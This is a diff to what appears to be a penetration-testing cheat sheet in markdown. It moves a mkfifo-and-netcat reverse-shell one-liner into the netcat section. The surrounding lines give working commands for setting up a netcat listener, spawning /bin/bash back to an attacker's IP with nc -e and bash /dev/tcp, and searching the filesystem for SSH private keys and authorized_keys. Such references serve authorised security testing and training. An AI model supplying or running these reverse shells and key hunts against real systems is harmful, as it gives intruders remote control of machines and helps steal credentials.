@@ -2,6 +2,7 @@
 ### Try using netcat as follows:-
 1. on your attacker machine set up a listener by:- nc -lvp "port"
 2. on the compromised machine connect with the listener and spawn shell by:- nc -e /bin/bash "attacking machine IP" "port"
+3. If -e flag is missing then use this `mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f`
 
 ### If netcat doesnt work then use netcat to set up listener in the attacker machine via netcat and use the following to get a reverse shell back
 /bin/bash -i >& /dev/tcp/IP/PORT 0>&1 (via bash)<br />
@@ -93,10 +94,6 @@ find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "autho
 ## To download something from the internet or from intranet:-
 
 Can do a wget or curl
-
-## To get a netcat shell in bsd if -e flag is missing
-
-mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f
 
 ## To locate a file 
 
